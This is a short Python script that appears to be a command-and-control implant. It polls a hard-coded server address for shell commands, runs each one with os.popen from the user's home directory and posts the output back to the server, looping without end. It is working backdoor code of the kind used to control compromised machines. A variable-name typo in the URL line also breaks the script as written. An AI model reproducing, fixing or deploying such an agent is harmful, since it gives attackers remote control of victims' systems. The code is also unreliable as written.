import requests
import os, sys
from pathlib import Path

# api-endpoint
URL = ''
c2_ip = '192.168.98.128'
c2_port = '3232'
c2_api_root = '/c2'

def call_c2():
    command = requests.get(URL+'/command')
    #command = command.text
    if command.text: # command not empty
        command = command.text
        print("execute command: "+command)
        result = os.popen(command).read() # execute command
        result = ("execute "+result) if not result else result # if result is empty
        #print(result)
        post_result(result, '/updatecommandresult')


def post_result(result, path):
    url = URL + path
    myobj = {'result': result}
    resc = requests.post(url, data=myobj)


if __name__ == '__main__':
    if len(sys.argv) >= 2:
        c2_ip = sys.argv[1]
    if len(sys.argv) >= 3:
        c2_port = sys.argv[2]
    os.chdir(Path.home()) # 設定之後執行的路徑為home目錄
    URL = 'http://' + c2_ip + ':' + c2_port + c2__api_root
    while True:
        call_c2()

